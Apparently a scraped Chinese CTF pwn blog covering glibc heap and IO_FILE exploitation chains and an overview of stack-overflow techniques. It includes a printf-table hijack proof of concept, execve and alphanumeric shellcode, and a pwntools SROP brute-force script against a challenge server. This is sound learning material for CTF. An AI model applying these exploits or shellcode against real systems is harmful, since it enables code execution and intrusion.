j___stpncpy_ifunc↑r.got.plt:00000000001ED128 ; Indirect relocation.got.plt:00000000001ED130 off_1ED130 dq offset __wcscmp_ifunc.got.plt:00000000001ED130 ; DATA XREF: j___wcscmp_ifunc↑r.got.plt:00000000001ED130 ; Indirect relocation.got.plt:00000000001ED138 off_1ED138 dq offset __libc_memmove_ifunc.got.plt:00000000001ED138 ; DATA XREF: j___libc_memmove_ifunc_0↑r.got.plt:00000000001ED138 ; Indirect relocation.got.plt:00000000001ED140 off_1ED140 dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r.got.plt:00000000001ED140 ; Indirect relocation.got.plt:00000000001ED148 off_1ED148 dq offset strchr_ifunc ; DATA XREF: j_strchr_ifunc↑r.got.plt:00000000001ED148 ; Indirect relocation.got.plt:00000000001ED150 off_1ED150 dq offset __wcschr_ifunc.got.plt:00000000001ED150 ; DATA XREF: j___wcschr_ifunc_0↑r.got.plt:00000000001ED150 ; Indirect relocation.got.plt:00000000001ED158 off_1ED158 dq offset __new_memcpy_ifunc.got.plt:00000000001ED158 ; DATA XREF: j___new_memcpy_ifunc↑r.got.plt:00000000001ED158 ; Indirect relocation.got.plt:00000000001ED160 off_1ED160 dq offset _dl_rtld_di_serinfo.got.plt:00000000001ED160 ; DATA XREF: __dl_rtld_di_serinfo↑r.got.plt:00000000001ED168 off_1ED168 dq offset _dl_allocate_tls.got.plt:00000000001ED168 ; DATA XREF: __dl_allocate_tls↑r.got.plt:00000000001ED170 off_1ED170 dq offset __tunable_get_val.got.plt:00000000001ED170 ; DATA XREF: ___tunable_get_val↑r.got.plt:00000000001ED178 off_1ED178 dq offset __wcslen_ifunc.got.plt:00000000001ED178 ; DATA XREF: j___wcslen_ifunc↑r.got.plt:00000000001ED178 ; Indirect relocation.got.plt:00000000001ED180 off_1ED180 dq offset memset_ifunc ; DATA XREF: j_memset_ifunc↑r.got.plt:00000000001ED180 ; Indirect relocation.got.plt:00000000001ED188 off_1ED188 dq offset __wcsnlen_ifunc.got.plt:00000000001ED188 ; DATA XREF: j___wcsnlen_ifunc↑r.got.plt:00000000001ED188 ; Indirect relocation.got.plt:00000000001ED190 off_1ED190 dq offset strcmp_ifunc ; DATA XREF: j_strcmp_ifunc↑r.got.plt:00000000001ED190 ; Indirect relocation.got.plt:00000000001ED198 off_1ED198 dq offset _dl_allocate_tls_init.got.plt:00000000001ED198 ; DATA XREF: __dl_allocate_tls_init↑r.got.plt:00000000001ED1A0 off_1ED1A0 dq offset __nptl_change_stack_perm.got.plt:00000000001ED1A0 ; DATA XREF: ___nptl_change_stack_perm↑r.got.plt:00000000001ED1A8 off_1ED1A8 dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r.got.plt:00000000001ED1A8 ; Indirect relocation.got.plt:00000000001ED1B0 off_1ED1B0 dq offset __strnlen_ifunc.got.plt:00000000001ED1B0 ; DATA XREF: j___strnlen_ifunc_0↑r.got.plt:00000000001ED1B0 _got_plt ends ; Indirect relocation 可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？ 笔者在glibc2.34的源代码中进行了查找: 12345// string/string.h/* Return the length of S. */extern size_t strlen (const char *__s) __THROW __attribute_pure__ __nonnull ((1)); 123456789101112131415161718192021222324252627282930313233343536373839404142434445// /sysdeps/alpha/strlen.S// ENTRY(strlen)#ifdef PROF ldgp gp, 0(pv) lda AT, _mcount jsr AT, (AT), _mcount .prologue 1#else .prologue 0#endif ldq_u t0, 0(a0) # load first quadword (a0 may be misaligned) lda t1, -1(zero) insqh t1, a0, t1 andnot a0, 7, v0 or t1, t0, t0 nop # dual issue the next two on ev5 cmpbge zero, t0, t1 # t1 &lt;- bitmask: bit i == 1 &lt;==&gt; i-th byte == 0 bne t1, $found$loop: ldq t0, 8(v0) addq v0, 8, v0 # addr += 8 cmpbge zero, t0, t1 beq t1, $loop$found: negq t1, t2 # clear all but least set bit and t1, t2, t1 and t1, 0xf0, t2 # binary search for that set bit and t1, 0xcc, t3 and t1, 0xaa, t4 cmovne t2, 4, t2 cmovne t3, 2, t3 cmovne t4, 1, t4 addq t2, t3, t2 addq v0, t4, v0 addq v0, t2, v0 nop # dual issue next two on ev4 and ev5 subq v0, a0, v0 ret END(strlen)libc_hidden_builtin_def (strlen) 发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。 笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。 由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。 而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。 同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。 其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数 此外，很多字符串相关函数，都会调用got表中123的函数，因此可以通过此来劫持。 不过在最近的比赛中，笔者打算使用libc.got 时，发现高版本libc似乎很多libc got链用不了了。 同时@kylebot 使用angr挖掘IO_FILE链启发了我，笔者打算写一个用argn挖掘可利用的libc.got的工具 #TODO 稍微鸽一下（ IO_FILE 在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流 house of apple 2/house of cat: _IO_wide_data 主打一个简单方便 house of Lys 主要在于，一般而言，用largebin attack进行攻击时，IO_FILE 的头我们是控制不了的，所以house of apple2存在一些不方便的地方。 而house of Lys和house of apple2一样简单，并且不需要控制head house of kiwi: _IO_file_jumps 缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert house of emma: _IO_cookie_jumps 需要能控制pointer_guard 如果要找到更多的IO_FILE 链呢？ 可以用angr自动化挖掘IO FILE链接 exit() exit 的流程在这篇blog中已经讲述得很详细了， 攻击点如下 __run_exit_handles中的__exit_funcs 需要绕过pointer_guard rtld_global的l_info（指向ELF的Dynamic段） 这是一个ld地址，所以和libc的地址可能会有一些不确定的偏移（和版本有关，可以开个对应版本的docker看看） 虽然Dynamic 段的结构是&lt;idx，偏移&gt;，但其实，l_info 的解析过程中，并不会检测其idx，所以其实只需要伪造偏移就行 通过控制l_info对应idx可以控制dl_fini的析构，主要是两种： fini_array 和 fini fini_array可以用来控制orw fini可以控制到一个函数执行，一般用one_gadget 直接修改libc的__libc_atexit节或者elf的fini_array 然而一个很现实的问题是这两个东西在高版本都已经不可写了 printf-fmt 这一条链来自house of husk的攻击手法 主要是对libc格式化字符串解析过程的攻击。 先看libc是如何解析格式化字符传，通过跟踪调试可以发现，其解析字符是 printf_positional 12345#ifdef COMPILE_WPRINTF nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);#else nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);#endif 此函数里面通过 __parse_one_cmb 解析格式化字符串，并将其转换为相应specs结构体。 1234567891011spec-&gt;info.spec = (wchar_t) *format++;spec-&gt;size = -1;if (__builtin_expect (__printf_function_table == NULL, 1) || spec-&gt;info.spec &gt; UCHAR_MAX || __printf_arginfo_table[spec-&gt;info.spec] == NULL /* We don&#x27;t try to get the types for all arguments if the formatuses more than one. The normal case is covered though. Ifthe call returns -1 we continue with the normal specifiers. */ || (int) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec]) (&amp;spec-&gt;info, 1, &amp;spec-&gt;data_arg_type, &amp;spec-&gt;size)) &lt; 0) 而在这个解析函数存在这样一个亮点 如果__printf_function_table != 0 并且__printf_arginfo_table[spec-&gt;info.spec] != 0 那么就会调用 __printf_arginfo_table[spec-&gt;info.spec] 这里的info-&gt;spec就是我们的格式化字符(例如’s’, ‘d’) 查看这两个地址： 123456789101112131415161718192021222324252627282930pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA Start End Perm Size Offset File 0x400000 0x401000 r--p 1000 0 /home/nemo/Pwn/workspace/basic_overflow/num 0x401000 0x402000 r-xp 1000 1000 /home/nemo/Pwn/workspace/basic_overflow/num 0x402000 0x403000 r--p 1000 2000 /home/nemo/Pwn/workspace/basic_overflow/num 0x403000 0x404000 r--p 1000 2000 /home/nemo/Pwn/workspace/basic_overflow/num 0x404000 0x405000 rw-p 1000 3000 /home/nemo/Pwn/workspace/basic_overflow/num 0x7ffff7dc4000 0x7ffff7dc6000 rw-p 2000 0 [anon_7ffff7dc4] 0x7ffff7dc6000 0x7ffff7dec000 r--p 26000 0 /usr/lib64/libc.so.6 0x7ffff7dec000 0x7ffff7f49000 r-xp 15d000 26000 /usr/lib64/libc.so.6 0x7ffff7f49000 0x7ffff7f96000 r--p 4d000 183000 /usr/lib64/libc.so.6 0x7ffff7f96000 0x7ffff7f9a000 r--p 4000 1d0000 /usr/lib64/libc.so.6 0x7ffff7f9a000 0x7ffff7f9c000 rw-p 2000 1d4000 /usr/lib64/libc.so.6 0x7ffff7f9c000 0x7ffff7fa6000 rw-p a000 0 [anon_7ffff7f9c] 0x7ffff7fc4000 0x7ffff7fc8000 r--p 4000 0 [vvar] 0x7ffff7fc8000 0x7ffff7fca000 r-xp 2000 0 [vdso] 0x7ffff7fca000 0x7ffff7fcb000 r--p 1000 0 /usr/lib64/ld-linux-x86-64.so.2 0x7ffff7fcb000 0x7ffff7ff1000 r-xp 26000 1000 /usr/lib64/ld-linux-x86-64.so.2 0x7ffff7ff1000 0x7ffff7ffb000 r--p a000 27000 /usr/lib64/ld-linux-x86-64.so.2 0x7ffff7ffb000 0x7ffff7ffd000 r--p 2000 30000 /usr/lib64/ld-linux-x86-64.so.2 0x7ffff7ffd000 0x7ffff7fff000 rw-p 2000 32000 /usr/lib64/ld-linux-x86-64.so.2 0x7ffffffdd000 0x7ffffffff000 rw-p 22000 0 [stack]0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall]pwndbg&gt; p &amp;__printf_arginfo_table $8 = (printf_arginfo_size_function ***) 0x7ffff7f9b8b0 &lt;__printf_arginfo_table&gt;pwndbg&gt; p __printf_function_table $9 = (printf_function **) 0x1000pwndbg&gt; p &amp;__printf_function_table $10 = (printf_function ***) 0x7ffff7f9c9a0 &lt;__printf_function_table&gt; 可以看到这两个的地址都是libc地址，如果存在两个libc任意写，就可以实现劫持。 不过其第一个参数是 spec-&gt;info， info的第一个成员是格式化的输出长度，如果没有指定，就是-1。 然而，一般程序是不会让你控制输出长度（也就是格式化字符前面的数字），所以并没有什么用处，大概率你是控制不了的，只能打one_gadgat。 写了个poc验证： 12345678910111213141516171819202122#include &lt;stdio.h&gt;int main()&#123; printf(&quot;Init Got&quot;); void *libc = *(unsigned long long *)0x404000-0x55c20; printf(&quot;Libc: %p\\n&quot;, libc); unsigned long long fake_arginfo[0x100] = &#123;0&#125;; fake_arginfo[&#x27;s&#x27;] = libc + 0x4f390; // system //fake_arginfo[&#x27;s&#x27;] = libc + 0xfb41f; unsigned long long *print_function = libc + 0x1d69a0; unsigned long long *print_arginfo = libc + 0x1d58b0; *print_arginfo = fake_arginfo; *print_function = 0x100; printf(&quot;Enter a number: %6845243s&quot;); // u32(b&#x27;;sh\\x00&#x27;) = 6845243 // printf(&quot;Enter a number: %1&quot;); return 0;&#125; 辅助攻击 tcache_perthread_struct 1234567891011/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; uint16_t counts[TCACHE_MAX_BINS]; // 2*0x40 = 0x80 tcache_entry *entries[TCACHE_MAX_BINS]; // 8*0x40 = 0x200&#125; tcache_perthread_struct;// 0x20+0x10*0x40 = 0x420 tcache_perthread_struct 是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。 在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。 一般是作为辅助攻击的方法，可以简化攻击链。 example [[2021-DownUnder-note]] global_max_fast 实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。 heap_info 直接攻击堆管理结构体，可以看看这篇帖子:house-of-mind #TODO Tricks 多线程堆 堆布局与分配 以下基于libc 2.35版本讲述 12345678910111213141516171819202122232425262728293031pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA Start End Perm Size Offset File 0x56234a398000 0x56234a399000 r--p 1000 0 /home/nemo/Pwn/workspace/2023ycb/heap/heap 0x56234a399000 0x56234a39a000 r-xp 1000 1000 /home/nemo/Pwn/workspace/2023ycb/heap/heap 0x56234a39a000 0x56234a39b000 r--p 1000 2000 /home/nemo/Pwn/workspace/2023ycb/heap/heap 0x56234a39b000 0x56234a39c000 r--p 1000 2000 /home/nemo/Pwn/workspace/2023ycb/heap/heap 0x56234a39c000 0x56234a39f000 rw-p 3000 3000 /home/nemo/Pwn/workspace/2023ycb/heap/heap 0x56234b28e000 0x56234b2af000 rw-p 21000 0 [heap] 0x7fc4627fd000 0x7fc4627fe000 ---p 1000 0 [anon_7fc4627fd] 0x7fc4627fe000 0x7fc462ffe000 rw-p 800000 0 [anon_7fc4627fe] 0x7fc462ffe000 0x7fc462fff000 ---p 1000 0 [anon_7fc462ffe] 0x7fc462fff000 0x7fc4637ff000 rw-p 800000 0 [anon_7fc462fff] 0x7fc4637ff000 0x7fc463800000 ---p 1000 0 [anon_7fc4637ff] 0x7fc463800000 0x7fc464000000 rw-p 800000 0 [anon_7fc463800] 0x7fc464000000 0x7fc464021000 rw-p 21000 0 [anon_7fc464000] 0x7fc464021000 0x7fc468000000 ---p 3fdf000 0 [anon_7fc464021] 0x7fc4685fa000 0x7fc4685fb000 ---p 1000 0 [anon_7fc4685fa] 0x7fc4685fb000 0x7fc468dfb000 rw-p 800000 0 [anon_7fc4685fb] 0x7fc468dfb000 0x7fc468dfc000 ---p 1000 0 [anon_7fc468dfb] 0x7fc468dfc000 0x7fc4695fc000 rw-p 800000 0 [anon_7fc468dfc] 0x7fc4695fc000 0x7fc4695fd000 ---p 1000 0 [anon_7fc4695fc] 0x7fc4695fd000 0x7fc469dfd000 rw-p 800000 0 [anon_7fc4695fd] 0x7fc469dfd000 0x7fc469dfe000 ---p 1000 0 [anon_7fc469dfd] 0x7fc469dfe000 0x7fc46a5fe000 rw-p 800000 0 [anon_7fc469dfe] 0x7fc46a5fe000 0x7fc46a5ff000 ---p 1000 0 [anon_7fc46a5fe] 0x7fc46a5ff000 0x7fc46adff000 rw-p 800000 0 [anon_7fc46a5ff] 0x7fc46adff000 0x7fc46ae00000 ---p 1000 0 [anon_7fc46adff] 0x7fc46ae00000 0x7fc46b600000 rw-p 800000 0 [anon_7fc46ae00] 0x7fc46b600000 0x7fc46b628000 r--p 28000 0 /home/nemo/Pwn/workspace/2023ycb/heap/libc-3.35.so 在线程分配空间时，会从线程堆中分配，但并不是每一个线程都有一个单独的线程堆，arena存在一个上限。 在上述程序中，线程堆的地址就是 0x7fc464000000 开始的这一部分。 查看此线程堆的组成： 123456789pwndbg&gt; telescope 0x7fc46400000000:0000│ 0x7fc464000000 —▸ 0x7fc464000030 ◂— 0x20000000001:0008│ 0x7fc464000008 ◂— 0x002:0010│ 0x7fc464000010 ◂— 0x2100003:0018│ 0x7fc464000018 ◂— 0x2100004:0020│ 0x7fc464000020 ◂— 0x100005:0028│ 0x7fc464000028 ◂— 0x006:0030│ 0x7fc464000030 ◂— 0x20000000007:0038│ 0x7fc464000038 ◂— 0x1 可以看出前0x30 的部分，是mmap分配出的内存的header。 继续往下查看: 12345678910111213141516pwndbg&gt; arena 0x7fc464000030 &#123; mutex = 0, flags = 2, have_fastchunks = 1, fastbinsY = &#123;0x7fc464000e10, 0x0, 0x0, 0x0, 0x7fc464000e30, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, top = 0x7fc464000fa0, last_remainder = 0x0, bins = &#123;....&#125; binmap = &#123;0, 0, 0, 0&#125;, next = 0x7fc46b819c80 &lt;main_arena&gt;, next_free = 0x0, attached_threads = 0, system_mem = 135168, max_system_mem = 135168,&#125; 可以看出从0x30开始，就是线程堆的arena 123456789101112131415pwndbg&gt; heap 0x7fc4640008d0 Free chunk (unsortedbin) | PREV_INUSE Addr: 0x7fc4640008d0 Size: 0x291 fd: 0x7fc464000090 bk: 0x7fc464000090Allocated chunk | NON_MAIN_ARENA Addr: 0x7fc464000b60 Size: 0x24Allocated chunk | PREV_INUSE | NON_MAIN_ARENA Addr: 0x7fc464000b80 Size: 0x75Allocated chunk | PREV_INUSE | NON_MAIN_ARENA Addr: 0x7fc464000bf0 Size: 0x25 继续往下查看，可以看到有一个0x290大小的堆块，应该是tcache 的管理结构体，为什么是free状态呢? 笔者暂且还没有探究，不过，经过笔者的测试，在此时，分配chunk也并不走tcache，而是直接走fastbin 。 #TODO 调试 查找多线程arena: 123&gt; arena# 查看其next指针&gt; arena &lt;next_addr&gt; 查看多线程heap: 12&gt; heap &lt;start_addr&gt; # 起始地址，一般偏移为0x8d0","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/categories/CTF/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://v3rdant.cn/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/tags/CTF/"}]},{"title":"Pwn.StackOverflow-Overview","slug":"Pwn.Stack-Overflow-Overview","date":"2022-08-02T16:00:00.000Z","updated":"2023-12-07T02:11:35.215Z","comments":true,"path":"Pwn.Stack-Overflow-Overview/","link":"","permalink":"https://v3rdant.cn/Pwn.Stack-Overflow-Overview/","excerpt":"","text":"杂谈 作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。 本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One 怎么去看待栈溢出题呢? 尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种: ret2syscall, ret2libc, ret2shellcode 实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。 一般而言，pwn题的目的都是getshell(当然，也有直接读取flag的，这个后面单独谈)，而getshell 无外乎就三种途径，syscall，libc-system，shellcode 当拿到一个题目时，首先思考： 是否有syscall----&gt;ret2syscall 有可读可写内存空间吗----&gt;ret2shellcode 给了libc文件或者有信息泄露函数(IO函数)----&gt;ret2libc 接下来，再分门别类谈: 0x1.ret2syscall 因为syscall属于相对简单的，暂且放在前面谈。 %rax System call %rdi %rsi %rdx %r10 %r8 %r9 59 sys_execve const char *filename const char *const argv[] const char *const envp[] 一般而言，需要syscall的题目中，都是构造这个系统调用实现。 而在一些题目中通过seccomp禁用了execve的调用，所以不能直接利用，那么就利用open, read, write 直接读取flag文件，也是一种办法。 而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。 在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。 或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。 总的而言，就是选择能够获取到地址的地方写入/bin/sh。 例题: ciscn_s_3 ret2shellcode shellcode的书写 一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含非可打印字符, 不能包含&quot;\\x00&quot;等等。所以尽可能自己熟悉shellcode的书写。 一个简单的shellcode例子: 123456789101112131415161718192021// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)push 0x68mov rax, 0x732f2f2f6e69622fpush raxmov rdi, rsp// push argument array [&#x27;sh\\x00&#x27;]// push b&#x27;sh\\x00&#x27; push 0x1010101 ^ 0x6873xor dword ptr [rsp], 0x1010101xor esi, esi /* 0 */push rsi /* null terminate */push 8pop rsiadd rsi, rsppush rsi /* &#x27;sh\\x00&#x27; */mov rsi, rspxor edx, edx /* 0 */// call execve()push SYS_execve /* 0x3b */pop raxsyscall 这里获取/bin/sh地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。 不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即jmp rax此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。 同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，mov和syscall都会遭到限制， 可用指令如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768691.数据传送:push/pop eax…pusha/popa2.算术运算:inc/dec eax…sub al, 立即数sub byte ptr [eax… + 立即数], al dl…sub byte ptr [eax… + 立即数], ah dh…sub dword ptr [eax… + 立即数], esi edisub word ptr [eax… + 立即数], si disub al dl…, byte ptr [eax… + 立即数]sub ah dh…, byte ptr [eax… + 立即数]sub esi edi, dword ptr [eax… + 立即数]sub si di, word ptr [eax… + 立即数]3.逻辑运算:and al, 立即数and dword ptr [eax… + 立即数], esi ediand word ptr [eax… + 立即数], si diand ah dh…, byte ptr [ecx edx… + 立即数]and esi edi, dword ptr [eax… + 立即数]and si di, word ptr [eax… + 立即数]xor al, 立即数xor byte ptr [eax… + 立即数], al dl…xor byte ptr [eax… + 立即数], ah dh…xor dword ptr [eax… + 立即数], esi edixor word ptr [eax… + 立即数], si dixor al dl…, byte ptr [eax… + 立即数]xor ah dh…, byte ptr [eax… + 立即数]xor esi edi, dword ptr [eax… + 立即数]xor si di, word ptr [eax… + 立即数]4.比较指令:cmp al, 立即数cmp byte ptr [eax… + 立即数], al dl…cmp byte ptr [eax… + 立即数], ah dh…cmp dword ptr [eax… + 立即数], esi edicmp word ptr [eax… + 立即数], si dicmp al dl…, byte ptr [eax… + 立即数]cmp ah dh…, byte ptr [eax… + 立即数]cmp esi edi, dword ptr [eax… + 立即数]cmp si di, word ptr [eax… + 立即数]5.转移指令:push 56hpop eaxcmp al, 43hjnz lable&lt;=&gt; jmp lable6.交换al, ahpush eaxxor ah, byte ptr [esp] // ah ^= alxor byte ptr [esp], ah // al ^= ahxor ah, byte ptr [esp] // ah ^= alpop eax7.清零:push 44hpop eaxsub al, 44h ; eax = 0push esipush esppop eaxxor [eax], esi ; esi = 0 一般而言, 我们采用xor或者sub指令修改shellcode后面的值，构造0f 05， 实现syscall。 一个例子(纯字母数字shellcode): 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129/* from call rax */push raxpush raxpop rcx/* XOR pop rsi, pop rdi, syscall */push 0x41413030pop raxxor DWORD PTR [rcx+0x30], eax/* XOR /bin/sh */push 0x34303041pop raxxor DWORD PTR [rcx+0x34], eaxpush 0x41303041pop raxxor DWORD PTR [rcx+0x38], eax/* rdi = &amp;&#x27;/bin/sh&#x27; */push rcxpop raxxor al, 0x34push rax/* rdx = 0 */push 0x30pop raxxor al, 0x30push raxpop rdxpush rax/* rax = 59 (SYS_execve) */push 0x41pop raxxor al, 0x7a/* pop rsi, pop rdi*//* syscall */ .byte 0x6e.byte 0x6f.byte 0x4e.byte 0x44/* /bin/sh */.byte 0x6e.byte 0x52.byte 0x59.byte 0x5a.byte 0x6e.byte 0x43.byte 0x5a.byte 0x41 构造尽可能短的shellcode可能用到的一些指令 1234cdp %The CDQ instruction copies the sign (bit 31) %of the value in the EAX register into every bit %position in the EDX register. shellcode生成工具 同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。 mprotect() 进一步的，很多题目没有天然的readable and executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。 这个函数可以修改指定内存段的权限 12345mprotect:int mprotect(void *addr, size_t len, int prot);addr 内存起始地址len 修改内存的长度prot 内存的权限，7为可读可写可执行 如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode ret2libc leak_libc 对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc. 目前而言，我遇到的栈题中leak_libc，有两种方法： partial_overwrite 有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。 通过puts，write等函数，打印.got，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本 1234567891011# ref: https://github.com/lieanu/LibcSearcherfrom LibcSearcher import *#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90)obj.dump(&quot;system&quot;) #system 偏移obj.dump(&quot;str_bin_sh&quot;) #/bin/sh 偏移obj.dump(&quot;__libc_start_main_ret&quot;) 另一个可以本地部署的实用工具是libc-database 12345678910111213141516$ ./find printf 260 puts f30archive-glibc (libc6_2.19-10ubuntu2_i386)$ ./dump libc6_2.19-0ubuntu6.6_i386offset___libc_start_main_ret = 0x19a83offset_system = 0x00040190offset_dup2 = 0x000db590offset_recv = 0x000ed2d0offset_str_bin_sh = 0x160a24$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626libc6_2.17-93ubuntu4_i386$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0libc6_2.17-93ubuntu4_i386$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4libc6_2.17-93ubuntu4_i386$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2libc6_2.17-93ubuntu4_i386 partial_overwrite 前置知识 针对没有泄露的赛题，可以考虑partial_overwrite改写got表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。 考虑对于一个got表中的64位地址: 0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖got为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall 爆破脚本写法 一个爆破脚本模板: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *import syself =&#x27;./ciscn_s_3&#x27;remote_add = &#x27;node4.buuoj.cn&#x27;remote_port = 29554main_add = 0x40051doff = 0x130system_add = 0x400517rtframe = 0x4004daret_add = 0x4004e9i = 0while i &lt; 20: try: context.log_level = &#x27;debug&#x27; context.arch = &#x27;amd64&#x27; if sys.argv[1] == &#x27;r&#x27;: p = remote(remote_add, remote_port, timeout = 1) elif sys.argv[1] == &#x27;d&#x27;: p = gdb.debug(elf) else: p = process(elf, timeout = 1) payload1 = b&#x27;/bin/sh\\0&#x27; + cyclic(0x8) payload1+= p64(main_add) p.sendline(payload1) stack_add = u64(p.recv(0x28)[-8::]) - off frame = SigreturnFrame() frame.rax = 0x3b frame.rdi = stack_add frame.rsi = 0 frame.rdx = 0 frame.rsp = stack_add frame.rip = system_add payload = b&#x27;/bin/sh\\0&#x27; + cyclic(0x8) payload+= p64(rtframe) payload+= p64(system_add) payload+= bytes(frame) #p.sendline(&#x27;a&#x27;) #p.recvuntil(&#x27;\\0&#x27;) p.sendline(payload) p.recvuntil(&#x27;/bin/sh&#x27;) p.sendline(&#x27;cat flag&#x27;) print(p.recvline()) p.close() except BaseException as e: p.close() off+=0x8 i+=1 核心模板: 1234567891011while True: try: // p = process() // pass p.sendline(&#x27;cat flag&#x27;) print(p.recvline()) p.close() except BaseException as e: p.close() // pass 采用grep 获取输出包含flag的行就行 ret2dl_resolve() 延迟绑定会使用_dl_resolve()函数 _dl_resolve中 _dl_resolve调用_dl_fixup, _dl_dixup流程： 通过link_map 获得.dynsym、.dynstr、.rel.plt地址 通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针 通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针 检查r_info 检查&amp;(Elf64_Sym)-&gt;st_other 通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数 综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法) 修改 dynamic 节的内容 修改重定位表项的位置 伪造 linkmap 主要前提要求 无 无 无信息泄漏时需要 libc 适用情况 NO RELRO NO RELRO, Partial RELRO NO RELRO, Partial RELRO 注意点 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 确保重定位位置可写；需要着重伪造重定位表项、符号表； Tricks ret2csu csu主要是为了控制rdx，一般如果gadget较少， 可能没有直接rdx， 一个典型的csu如下 123456789101112131415161718.text:0000000000400940 loc_400940: ; CODE XREF: __libc_csu_init+54↓j.text:0000000000400940 mov rdx, r15.text:0000000000400943 mov rsi, r14.text:0000000000400946 mov edi, r13d.text:0000000000400949 call ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8].text:000000000040094D add rbx, 1.text:0000000000400951 cmp rbp, rbx.text:0000000000400954 jnz short loc_400940.text:0000000000400956.text:0000000000400956 loc_400956: ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400956 add rsp, 8.text:000000000040095A pop rbx.text:000000000040095B pop rbp.text:000000000040095C pop r12.text:000000000040095E pop r13.text:0000000000400960 pop r14.text:0000000000400962 pop r15.text:0000000000400964 retn 那么通过0x400956和0x400940的组合，就可以控制rdx 了。 将r12+rbx*8 控制为一个无效got表项，并且令rbx比rbp大1，就可以循环劫持控制流了。 stack pivoting 栈迁移技巧， 主要针对可溢出字节较少的情况，通过leave此类指令控制rsp 123456;leave 相当于:mov 